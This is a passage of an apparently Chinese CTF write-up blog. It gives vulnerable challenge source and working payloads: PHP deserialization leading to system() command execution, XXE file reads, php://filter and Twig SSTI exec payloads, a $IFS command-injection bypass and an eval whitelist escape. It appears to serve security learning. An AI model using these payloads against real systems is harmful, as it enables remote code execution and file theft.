class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params">$func, $p</span>) </span>&#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        <span class="keyword">if</span> ($a == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $result;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $p = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> $func = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> ($this-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    $p = $_REQUEST[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($func != <span class="literal">null</span>) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            echo gettime($func, $p);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            die(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure><p>构造反序列化</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $p = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> $func = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($this-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> Test();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure><p>找flag的payload</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=unserialize&amp;p=O%3a4%3a<span class="string">&quot;Test&quot;</span>%3a2%3a&#123;s%3a1%3a<span class="string">&quot;p&quot;</span>%3bs%3a18%3a<span class="string">&quot;find+/+-name+flag*&quot;</span>%3bs%3a4%3a<span class="string">&quot;func&quot;</span>%3bs%3a6%3a<span class="string">&quot;system&quot;</span>%3b&#125;</span><br></pre></td></tr></table></figure><p>读flag</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func=highlight_file&amp;p=<span class="regexp">/tmp/</span>flagoefiu4r93</span><br></pre></td></tr></table></figure><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>XXE</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line"></span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY admin SYSTEM <span class="string">&quot;file:///flag&quot;</span> &gt;]&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>dwad<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>php://的一个trick，dwad那一块可以任意填写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?category=php://filter/read=convert.base64-encode/woofers/dwad%20aw/resource=flag</span><br></pre></td></tr></table></figure><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>这个老实说，是自己知识面不够了，才知道在某种情况下unicode字符会跟数字有个等价性</p><p><a href="https://www.compart.com/en/unicode/U+2187">https://www.compart.com/en/unicode/U+2187</a></p><p>这个字符大于需要买的东西的价格，发包的时候参数为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=4&amp;price=%E2%86%87</span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p>根据题目发现cookie中的内容输出在页面上，尝试ssti，63，页面输出63，的确存在。</p><p>php中的ssti最常见的对应的是twig引擎，有<a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/">一篇文章</a>写的很好，把所有ssti都讲了一遍</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">&quot;cat /flag&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化逃逸字符串，然后替换掉img的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">get:f=show_image</span><br><span class="line">post:_SESSION[flagflag]=&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br><span class="line"></span><br><span class="line">post:_SESSION[fl1gfl1g]=&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</span><br></pre></td></tr></table></figure><h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; intval(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==md5(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = str_ireplace(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        system(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>robots.txt -&gt; fakeflag -&gt; header头里发现上述文件</p><p>payload:<code>fl4g.php?num=2e9&amp;md5=0e215962017&amp;get_flag=ca\t$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></p><h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload: <code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag</code></p><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># #encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):</span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, 